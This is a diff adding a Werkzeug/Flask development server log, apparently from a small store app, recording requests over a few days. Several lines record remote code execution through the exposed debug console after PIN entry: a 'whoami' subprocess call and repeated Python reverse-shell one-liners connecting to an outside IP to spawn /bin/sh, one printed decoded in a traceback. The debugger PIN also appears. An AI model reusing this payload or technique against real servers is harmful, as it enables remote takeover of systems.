@@ -1,0 +1,174 @@
+INFO:werkzeug: * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
+INFO:werkzeug: * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 331-471-785
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:02:47] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:02:47] "[37mGET /static/script.js HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:02:47] "[37mGET /static/style.css HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:02:48] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:02:54] "[37mGET /console HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:02:55] "[37mGET /console?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:02:56] "[37mGET /console?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:02:56] "[37mGET /console?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+INFO:werkzeug: * To enable the debugger you need to enter the security pin:
+INFO:werkzeug: * Debugger pin code: 331-471-785
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:02:57] "[37mGET /console?__debugger__=yes&cmd=printpin&s=7nUcWdDfrwv0aXDppcF5 HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:02:57] "[37mGET /console?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:02:58] "[37mGET /console?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:03:00] "[37mGET /console?__debugger__=yes&cmd=pinauth&pin=35.238.17.220&s=7nUcWdDfrwv0aXDppcF5 HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:03:17] "[37mGET /console?__debugger__=yes&cmd=pinauth&pin=331-471-785&s=7nUcWdDfrwv0aXDppcF5 HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:03:38] "[37mGET /console?__debugger__=yes&cmd=import%20subprocess%3Bout%20%3D%20subprocess.Popen(%5B%27whoami%27%5D%2C%20stdout%3Dsubprocess.PIPE%2C%20stderr%3Dsubprocess.STDOUT)%3Bstdout%2Cstderr%20%3D%20out.communicate()%3Bprint(stdout)%3B&frm=0&s=7nUcWdDfrwv0aXDppcF5 HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:13:40] "[37mGET /console?__debugger__=yes&cmd=import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2235.222.92.192%22%2C6666))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)&frm=0&s=7nUcWdDfrwv0aXDppcF5 HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:15:36] "[35m[1mGET /console?__debugger__=yes&cmd=import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2235.222.92.192%22%2C6666))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)&frm=0&s=7nUcWdDfrwv0aXDppcF5 HTTP/1.1[0m" 500 -
+ERROR:werkzeug:Error on request:
+Traceback (most recent call last):
+  File "/home/hsharma_gitlab_com/.local/lib/python3.6/site-packages/werkzeug/debug/console.py", line 182, in runcode
+    exec(code, self.locals)
+  File "<debugger>", line 1, in <module>
+    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("35.222.92.192",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
+TimeoutError: [Errno 110] Connection timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/hsharma_gitlab_com/.local/lib/python3.6/site-packages/werkzeug/serving.py", line 323, in run_wsgi
+    execute(self.server.app)
+  File "/home/hsharma_gitlab_com/.local/lib/python3.6/site-packages/werkzeug/serving.py", line 312, in execute
+    application_iter = app(environ, start_response)
+  File "/home/hsharma_gitlab_com/.local/lib/python3.6/site-packages/werkzeug/debug/__init__.py", line 491, in __call__
+    response = self.execute_command(request, cmd, frame)
+  File "/home/hsharma_gitlab_com/.local/lib/python3.6/site-packages/werkzeug/debug/__init__.py", line 351, in execute_command
+    return Response(frame.console.eval(command), mimetype="text/html")
+  File "/home/hsharma_gitlab_com/.local/lib/python3.6/site-packages/werkzeug/debug/console.py", line 216, in eval
+    return self._ipy.runsource(code)
+  File "/home/hsharma_gitlab_com/.local/lib/python3.6/site-packages/werkzeug/debug/console.py", line 169, in runsource
+    self, source_to_eval, "<debugger>", "single"
+  File "/usr/lib/python3.6/code.py", line 75, in runsource
+    self.runcode(code)
+  File "/home/hsharma_gitlab_com/.local/lib/python3.6/site-packages/werkzeug/debug/console.py", line 184, in runcode
+    self.showtraceback()
+  File "/home/hsharma_gitlab_com/.local/lib/python3.6/site-packages/werkzeug/debug/console.py", line 190, in showtraceback
+    sys.stdout._write(tb.render_summary())
+AttributeError: '_io.TextIOWrapper' object has no attribute '_write'
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:16:30] "[37mGET /console?__debugger__=yes&cmd=import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2235.222.92.192%22%2C80))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)&frm=0&s=7nUcWdDfrwv0aXDppcF5 HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:16:53] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:16:54] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:16:58] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:17:06] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:17:07] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:17:08] "[37mGET /login HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:17:11] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:17:25] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:17:25] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug: * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 331-471-785
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:21:07] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:21:07] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:21:11] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:23:37] "[37mGET /restock HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:23:44] "[37mPOST /api/v1.0/storeAPI HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:23:48] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:23:52] "[37mGET /api/v1.0/storeAPI/test HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:28:57] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:28:57] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:28:58] "[37mGET /static/style.css HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:28:58] "[37mGET /static/script.js HTTP/1.1[0m" 200 -
+INFO:werkzeug: * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 331-471-785
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:44:01] "[37mGET /console HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:44:02] "[37mGET /console?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:44:04] "[37mGET /console?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:44:04] "[37mGET /console?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:44:06] "[37mGET /console?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:44:08] "[37mGET /console?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:44:09] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:44:09] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:44:29] "[37mGET /login HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:44:34] "[37mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:44:41] "[37mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:44:42] "[37mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:44:45] "[37mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:44:46] "[37mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:44:48] "[37mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 200 -
+INFO:werkzeug: * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 331-471-785
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:47:10] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:47:10] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug: * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 331-471-785
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:52:06] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:52:06] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug: * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 331-471-785
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:53:19] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:53:19] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:53:23] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:54:14] "[37mGET /console HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:54:15] "[37mGET /console?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:54:15] "[37mGET /console?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:54:15] "[37mGET /console?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:54:16] "[37mGET /console?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:55:34] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:55:37] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:55:37] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:55:39] "[37mGET /restock HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:55:44] "[37mPOST /api/v1.0/storeAPI HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:55:47] "[37mPOST /api/v1.0/storeAPI HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:55:49] "[37mPOST /api/v1.0/storeAPI HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:55:50] "[37mPOST /api/v1.0/storeAPI HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:55:50] "[37mPOST /api/v1.0/storeAPI HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:55:53] "[37mPOST /api/v1.0/storeAPI HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:55:54] "[37mPOST /api/v1.0/storeAPI HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:55:54] "[37mPOST /api/v1.0/storeAPI HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:55:56] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:56:01] "[37mGET /api/v1.0/storeAPI/test HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:56:09] "[37mGET /login HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:57:33] "[35m[1mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 500 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:57:35] "[35m[1mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 500 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:57:45] "[35m[1mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 500 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:57:47] "[35m[1mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 500 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:57:47] "[35m[1mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 500 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:57:50] "[35m[1mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 500 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:57:51] "[35m[1mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 500 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:57:51] "[35m[1mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 500 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:57:53] "[35m[1mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 500 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:57:57] "[37mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:57:57] "[37mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:57:58] "[37mPOST /api/v1.0/storeLoginAPI/ HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:58:04] "[37mGET /restock HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 13:01:18] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 13:01:18] "[37mGET /static/style.css HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 13:01:18] "[37mGET /static/script.js HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 13:01:19] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 13:12:19] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 13:12:20] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 13:22:47] "[37mGET /console HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 13:22:47] "[37mGET /console?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 13:22:47] "[37mGET /console?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 13:22:47] "[37mGET /console?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 13:22:49] "[37mGET /console?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 14:13:23] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 14:13:23] "[37mGET /static/style.css HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 14:13:23] "[37mGET /static/script.js HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 14:13:24] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 15:38:42] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [19/Nov/2020 04:58:40] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [19/Nov/2020 04:58:41] "[36mGET /static/style.css HTTP/1.1[0m" 304 -
+INFO:werkzeug:43.255.164.12 - - [19/Nov/2020 04:58:41] "[36mGET /static/script.js HTTP/1.1[0m" 304 -
+INFO:werkzeug:43.255.164.12 - - [19/Nov/2020 04:58:42] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
+INFO:werkzeug:43.255.164.12 - - [19/Nov/2020 04:58:45] "[37mGET /login HTTP/1.1[0m" 200 -
+INFO:werkzeug:183.83.46.112 - - [27/Nov/2020 07:30:27] "[37mGET / HTTP/1.1[0m" 200 -
+INFO:werkzeug:183.83.46.112 - - [27/Nov/2020 07:30:27] "[36mGET /static/style.css HTTP/1.1[0m" 304 -
+INFO:werkzeug:183.83.46.112 - - [27/Nov/2020 07:30:29] "[36mGET /static/script.js HTTP/1.1[0m" 304 -
+INFO:werkzeug:183.83.46.112 - - [27/Nov/2020 07:30:29] "[37mGET /favicon.ico HTTP/1.1[0m" 200 -
